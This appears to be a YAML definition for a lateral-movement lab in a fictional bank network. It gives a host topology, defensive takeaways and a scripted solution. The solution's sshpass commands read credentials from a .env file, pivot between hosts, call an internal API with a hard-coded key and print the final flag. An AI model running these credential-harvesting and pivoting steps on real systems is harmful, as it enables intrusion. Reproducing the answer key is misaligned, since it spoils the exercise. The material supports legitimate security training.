topology:
  nodes:
    - id: "host-a"
      label: "Teller Workstation"
      type: "workstation"
      ip_offset: "15"
      ports: [22]
      services: ["OpenSSH"]
      x: 2
      y: 1
    - id: "host-b"
      label: "App Server"
      type: "server"
      ip_offset: "32"
      ports: [22]
      services: ["OpenSSH"]
      x: 4
      y: 1
    - id: "host-c"
      label: "Core API"
      type: "server"
      ip_offset: "48"
      ports: [8080]
      services: ["HTTP API"]
      x: 6
      y: 1
  edges:
    - from: "attacker"
      to: "host-a"
      label: "SSH:22"
      access: "direct"
    - from: "host-a"
      to: "host-b"
      label: "SSH:22"
      access: "internal"
    - from: "host-b"
      to: "host-c"
      label: "HTTP:8080"
      access: "internal"

troubleshooting: "If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty."
defensive_takeaways: "Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution."
test:
  steps:
    - name: "SSH to host-a as teller"
      command: "sshpass -p '{cred.teller.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.teller.user}@{target.host-a} 'whoami' 2>&1"
      expect: "teller"
      timeout: 15

    - name: "Read DB config from host-a to discover host-b credentials"
      command: "sshpass -p '{cred.teller.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.teller.user}@{target.host-a} 'cat /var/www/banking-app/.env 2>/dev/null | grep DB_PASS' 2>&1"
      expect: "M3r1d14n_App_2024#"
      timeout: 15

    - name: "Read token 1 from host-a"
      command: "sshpass -p '{cred.teller.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.teller.user}@{target.host-a} 'cat /home/teller/assessment_token.txt' 2>&1"
      expect: "thr33"
      timeout: 15

    - name: "SSH to host-b with discovered credentials"
      command: "sshpass -p '{cred.appuser.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.appuser.user}@{target.host-b} 'whoami' 2>&1"
      expect: "appuser"
      timeout: 15

    - name: "Read API config from host-b and get token 2"
      command: "sshpass -p '{cred.appuser.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.appuser.user}@{target.host-b} 'cat /opt/meridian/services/api-gateway/config.yml 2>/dev/null && echo --- && cat /home/appuser/marker.txt' 2>&1"
      expect: "h0p"
      timeout: 15

    - name: "Curl host-c API with discovered API key to get token 3"
      command: "sshpass -p '{cred.appuser.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.appuser.user}@{target.host-b} 'curl -s -H \"X-API-Key: MTB_k3y_h0p_l4t3r4l\" http://meridian-core:8080/api/vault' 2>&1"
      expect: "l4t3r4l"
      timeout: 15

    - name: "Assemble and verify complete flag"
      command: "echo 'OCR{thr33_h0p_l4t3r4l}'"
      expect: "OCR{"
